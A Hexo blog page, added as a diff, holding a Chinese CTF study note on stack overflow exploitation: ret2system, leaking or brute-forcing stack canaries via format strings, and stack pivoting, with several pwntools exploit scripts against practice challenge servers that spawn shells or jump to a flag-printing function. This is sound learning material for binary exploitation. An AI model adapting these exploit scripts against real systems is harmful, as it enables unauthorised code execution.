@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="当栈中不止可以溢出到eip，且程序中存在system以及&#x2F;bin&#x2F;sh时，此时可以直接跳转到system,payload&#x3D;’a’*offest+’bbbb’+p32(system)+p32(system函数的返回地址)+p32(bin_ad)更复杂的情况(没有&#x2F;bin&#x2F;sh)：    1.寻找sh    2.手动将&#x2F;bin&#x2F;sh或者sh填充到某一已知地址 再复杂一点没给system：    1.有">
+<meta property="og:type" content="website">
+<meta property="og:title" content="pwn之栈">
+<meta property="og:url" content="http://example.com/drafts/pwn%E4%B9%8B%E6%A0%88.html">
+<meta property="og:site_name" content="Archerの博客">
+<meta property="og:description" content="当栈中不止可以溢出到eip，且程序中存在system以及&#x2F;bin&#x2F;sh时，此时可以直接跳转到system,payload&#x3D;’a’*offest+’bbbb’+p32(system)+p32(system函数的返回地址)+p32(bin_ad)更复杂的情况(没有&#x2F;bin&#x2F;sh)：    1.寻找sh    2.手动将&#x2F;bin&#x2F;sh或者sh填充到某一已知地址 再复杂一点没给system：    1.有">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-16T12:47:00.000Z">
+<meta property="article:modified_time" content="2021-06-05T12:53:15.171Z">
+<meta property="article:author" content="Archer">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>pwn之栈 | Archerの博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Archerの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录一个菜鸡的成长之路</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-about"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-categories"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archives"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h1 class="post-title" itemprop="name headline">pwn之栈</h1>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>当栈中不止可以溢出到eip，且程序中存在system以及/bin/sh时，此时可以直接跳转到system,payload=’a’*offest+’bbbb’+p32(system)+p32(system函数的返回地址)+p32(bin_ad)<br>更复杂的情况(没有/bin/sh)：<br>    1.寻找sh<br>    2.手动将/bin/sh或者sh填充到某一已知地址</p>
+<p>再复杂一点没给system：<br>    1.有puts，write等输出函数-&gt;泄露libc<br>    2.ropchain(系统调用)<br>    3.没开nx<br>    4.有mprotect</p>
+<p>再复杂一点只能溢出到eip：<br>    1.栈迁移(通过控制sp来控制程序流程)</p>
+<p>再复杂一点64位的程序：<br>    1.通过rop传参</p>
+<p>canary泄漏<br>第1种绕过方式：<br>泄露canary的内容<br>    a.确定canary的偏移量<br>            canary位于ebp-8处<br>            当程序中存在字符串格式化漏洞时，可以通过%?$p来泄露canary的内容，?为canary的位置(当canary是程序中第23个参数时,即为%23$p,当程序为64位时,先用寄存器存参数，64位中8个bp相当于一个参数,32位中是4位)<br>            例题<br>            攻防世界MMary_Morton<br>            64位，开了nx和canary<br>            -0000000000000090 buf             db ?<br>            -0000000000000008 var_8           dq ?//canary位置<br>            +0000000000000000  s              db 8 dup(?)<br>            +0000000000000008  r              db 8 dup(?)</p>
+<pre><code>        输入aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+        aaaa-0x7fff9e3ab840-0x7f-0x7f109dd50260-(nil)-(nil)-0x2d70252d61616161
+        得到offest=5+(0x90-0x8)/8=23
+        exp
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">40211</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3. Exit the battle &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cat_flag=<span class="number">0x4008DA</span></span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(cat_flag)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
+        exp
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">40211</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3. Exit the battle &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cat_flag=<span class="number">0x4008DA</span></span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">10</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(cat_flag)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</code></pre>
+<p>第2种方式：<br>    爆破canary值<br>        例题bin1<br>        exp<br>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">canary=<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="built_in">chr</span>(j))</span><br><span class="line">        q=p.recvuntil(<span class="string">&#x27;welcome&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;sucess&#x27;</span> <span class="keyword">in</span> q:</span><br><span class="line">            canary+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+p32(system_addr))</span><br><span class="line">p.interavtive()</span><br></pre></td></tr></table></figure></p>
+<p>第3种绕过方式stack smash</p>
+<p>第4种绕过方式fs寄存器</p>
+<p>栈迁移<br>栈迁移一般使用于程序溢出量较小的场景，原理是通过控制esp来控制eip从而控制程序流程<br>例题：buu ciscn_2019_s_4<br>vul函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>];</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>read处可以溢出到eip,并且第一个read可以泄露ebp，当我们第二次调用read时，就可以在里面填充伪造的栈内容了(控制ebp)，当结束完read的调用后，会执行leave ret,第一次leave，改变了ebp，第二次leave，esp改为我们设置的ebp，然后再跳转到对应的地方成功<br>getshell<br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">0</span>):</span><br><span class="line">	p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">		arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">	<span class="comment">#context( os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29690</span>)</span><br><span class="line">	elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">		arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">	<span class="comment">#context( os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">sys_ad=<span class="number">0x08048400</span></span><br><span class="line">leave_ad=<span class="number">0x080485FD</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;ebp: &quot;</span>+<span class="built_in">hex</span>(ebp))</span><br><span class="line">payload=<span class="string">&quot;aaaa&quot;</span>+p32(sys_ad)+p32(<span class="number">0</span>)+p32(ebp-<span class="number">0x28</span>)+<span class="string">&quot;/bin/sh\x00\x00&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload+=p32(ebp-<span class="number">0x38</span>)+p32(leave_ad)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当调用函数发生的过程：<br>push eip+4;<br>push ebp;<br>mov ebp,esp;</p>
+<p>结束：<br>leave == mov esp,ebp<br>ret ==pop eip</p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Archer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
